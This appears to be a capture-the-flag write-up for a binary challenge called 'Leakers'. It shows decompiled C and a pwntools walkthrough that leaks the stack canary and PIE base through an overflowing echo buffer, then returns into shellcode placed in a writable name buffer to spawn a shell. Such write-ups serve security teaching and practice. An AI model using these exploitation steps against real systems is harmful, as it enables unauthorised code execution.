# Leakers

**Category:** Mitigations

## Overview

```text
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```
```text
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int len; // [rsp+4h] [rbp-7Ch]
  char echostring[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v6; // [rsp+78h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 0);
  if ( mprotect((void *)((unsigned __int64)ps1 & 0xFFFFFFFFFFFFF000LL), 0x1000u, 7) == -1 )
  {
    perror("mprotect");
    exit(1);
  }
  puts("Welcome to Leakers!");
  puts("What's your name?");
  len = read(0, ps1, 0x64u);
  if ( len > 1 && ps1[len - 1] == 10 )
    ps1[len - 1] = 0;
  while ( 1 )
  {
    printf("Echo: ");
    if ( (unsigned int)read(0, echostring, 200u) == 1 && (echostring[0] == 10 || !echostring[0]) )
      break;
    printf("%s> %s", ps1, echostring);
  }
  puts("Bye!");
  return 0;
}
```



## Analysis
From the decompiled code above we can see that we have an overflow in `echostring` (104 allocated size, 200 characters in the read).
The challenge also uses a canary, so to exploit the overflow we must leak the canary.
We can leak the canary using the `echostring` since it prints the content of the address where the last character is placed.


## Vulnerability
Buffer overflow in `echostring`


## Exploitation
We place the shellcode in the name that is variable `ps1`.
```python
payload_ps1 = asm(shellcraft.sh())
r.recvuntil(b"name?\n")
r.sendline(payload_ps1)
```

Then we use the `echostring` variable to print the canary and store it.
The +1 in `payload_canary` is used to overwrite the first zeros at the start of the canary, in this way it can be printed to screen (those zeros are interpreted as a terminating byte).

```python
payload_canary = b"A" * (0x68 + 1)
r.recvuntil(b"Echo: ")
r.send(payload_canary)
```
We store the canary

```python
r.recvuntil(payload_canary)
canary = u64(b"\x00"+ r.recv(7))
```

Since we have a while(1) in the code, the `echostring` logic is executed continuously.

Now we must leak the base address of the binary since it was compiled with PIE; to do so, we overflow `echostring` to get the address of `main`

```python
payload_base = b"A" * (0x68 + 6*8)
r.recvuntil(b"Echo: ")
r.send(payload_base)

r.recvuntil(payload_base)
leak = r.recv(6).ljust(8, b"\x00")
CHALL.address = u64(leak) - CHALL.symbols["main"]
leak = hex(u64(leak))
```

Now we simply craft the final overflow string using the canary we leaked and the address of `ps1` as return address.
In this way we can overflow the variable, inject the correct canary and jump to the address where the shellcode was placed.

Now to get the shell we just send a newline to the read on `echostring` to execute the break to terminate the program and execute the shellcode.

```text
if ( (unsigned int)read(0, echostring, 200u) == 1 && (echostring[0] == '\n' || !echostring[0]) )
      break;
```


 

